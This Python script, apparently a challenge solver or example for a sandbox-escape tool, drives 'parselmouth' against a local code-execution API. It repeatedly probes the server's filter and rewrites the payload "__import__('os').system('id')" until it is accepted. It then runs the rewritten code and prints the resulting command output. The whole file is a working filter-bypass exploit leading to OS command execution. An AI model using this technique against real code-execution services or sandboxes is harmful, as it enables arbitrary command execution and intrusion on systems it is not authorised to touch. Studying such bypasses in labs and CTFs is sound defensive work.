import ast
import os
import sys
import threading
import time
import requests
import socketio

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
SERVER_URL = "http://127.0.0.1:6000"
PAYLOAD = "__import__('os').system('id')"

sys.path.insert(0, ROOT)

import parselmouth as p9h


def challenge_check(payload):
    if isinstance(payload, ast.AST):
        payload = ast.unparse(payload)

    response = requests.post(
        SERVER_URL + "/api/run",
        json={
            "code": payload,
            "args": "",
        },
        timeout=5,
    ).json()
    if response.get("success"):
        pid = response.get("pid")
        if pid:
            try:
                requests.post(
                    SERVER_URL + "/api/terminate",
                    json={"pid": pid},
                    timeout=5,
                ).json()
            except Exception:
                pass
        return []

    return [response.get("message", "server reject")]


def execute_payload(payload):
    output = []
    process_end = threading.Event()
    sio = socketio.Client(logger=False, engineio_logger=False)

    @sio.on("output")
    def on_output(data):
        output.append(data.get("data", ""))

    @sio.on("process_end")
    def on_process_end(data):
        process_end.set()

    try:
        sio.connect(SERVER_URL, wait_timeout=5)
        response = requests.post(
            SERVER_URL + "/api/run",
            json={
                "code": payload,
                "args": "",
            },
            timeout=5,
        ).json()

        if response.get("success"):
            pid = response.get("pid")
            if not process_end.wait(5) and pid:
                try:
                    requests.post(
                        SERVER_URL + "/api/terminate",
                        json={"pid": pid},
                        timeout=5,
                    ).json()
                except Exception:
                    pass
            time.sleep(0.2)

        return response, "".join(output)
    finally:
        if sio.connected:
            sio.disconnect()


orig_check = p9h.check
p9h.check = challenge_check
try:
    transformed = p9h.P9H(
        PAYLOAD,
        versbose=2,
    ).visit()
finally:
    p9h.check = orig_check

response, stdout = execute_payload(transformed)

print("[*] input payload:")
print(PAYLOAD)
print("\n[*] transformed payload:")
print(transformed)
print("\n[*] api response:")
print(response)
print("\n[*] stdout:")
print(stdout.rstrip())
